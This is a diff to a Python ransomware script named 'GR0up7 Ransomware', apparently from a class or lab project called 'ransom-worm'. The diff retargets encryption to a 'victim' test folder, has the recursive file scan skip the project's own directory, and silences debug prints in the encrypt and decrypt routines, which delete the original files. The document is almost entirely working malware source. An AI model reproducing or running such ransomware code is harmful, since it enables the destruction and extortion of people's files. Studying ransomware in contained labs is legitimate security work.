@@ -23,7 +23,7 @@ from PIL import ImageTk, Image
 KEEP_ACTIVE_WINDOW_TIME = 20
 
 # ENCRYPT_FOLDER_PATH = "../Documents"
-ENCRYPT_FOLDER_PATH = "../"  # CHANGE THIS
+ENCRYPT_FOLDER_PATH = "/home/victim/Desktop/TestFolder"  # CHANGE THIS
 EXCLUDED_EXTENSIONS = ['.py', '.pem', '.exe', '.so', '.GR0up7', '.jpeg']  # CHANGE THIS
 RANWOMWARE_WINDOW_NAME = 'GR0up7 Ransomware'  # CHANGE THIS
 
@@ -119,12 +119,18 @@ class GUI(Thread):
 
 ###########################################################################################################################
 
+file_path = Path(__file__).resolve()
+dir_path = file_path.parent
+
 def scanRecurse(baseDir):
     for entry in os.scandir(baseDir):
         if entry.is_file():
             yield entry
         else:
-            yield from scanRecurse(entry.path)
+            if 'ransom-worm' in entry.path:
+                continue
+            else:
+                yield from scanRecurse(entry.path)
 
 def decrypt(dataFile, privateKeyFile):
 
@@ -152,7 +158,7 @@ def decrypt(dataFile, privateKeyFile):
     with open(decryptedFile, 'wb') as f:
         f.write(data)
 
-    print('Decrypted file saved to ' + decryptedFile)
+    #print('Decrypted file saved to ' + decryptedFile)
     os.remove(dataFile)
     
 def encrypt(dataFile, publicKey):
@@ -163,7 +169,7 @@ def encrypt(dataFile, publicKey):
     '''
     # read data from file
     extension = dataFile.suffix.lower()
-    print(extension)
+    #print(extension)
     dataFile = str(dataFile)
     with open(dataFile, 'rb') as f:
         data = f.read()
